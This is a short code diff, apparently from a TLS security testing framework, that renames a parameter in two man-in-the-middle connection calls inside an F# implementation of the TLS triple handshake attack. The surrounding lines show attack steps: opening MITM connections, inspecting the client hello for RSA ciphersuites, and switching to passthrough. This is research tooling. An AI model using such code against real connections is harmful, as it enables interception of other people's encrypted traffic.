@@ -58,7 +58,7 @@ type Attack_TripleHandshake =
         in
 
         // Start being a Man-In-The-Middle
-        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listener_port=attacker_port,server_cn=server_name,server_port=port) in
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listen_port=attacker_port,server_cn=server_name,server_port=port) in
 
         // Receive client hello and ensure the client proposes at least one RSA key exchange ciphersuite
         let sst,snsc,sch = FlexClientHello.receive(sst) in
@@ -126,7 +126,7 @@ type Attack_TripleHandshake =
 
 
         // Create two new Tcp connections as MITM
-        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listener_port=attacker_port,server_cn=server_name,server_port=port) in
+        let sst,_,cst,_ = FlexConnection.MitmOpenTcpConnections(attacker_server_name,server_name,listen_port=attacker_port,server_cn=server_name,server_port=port) in
 
         // Enter passthrough mode for the rest of the attack
         let _ = FlexConnection.passthrough(cst.ns,sst.ns) in
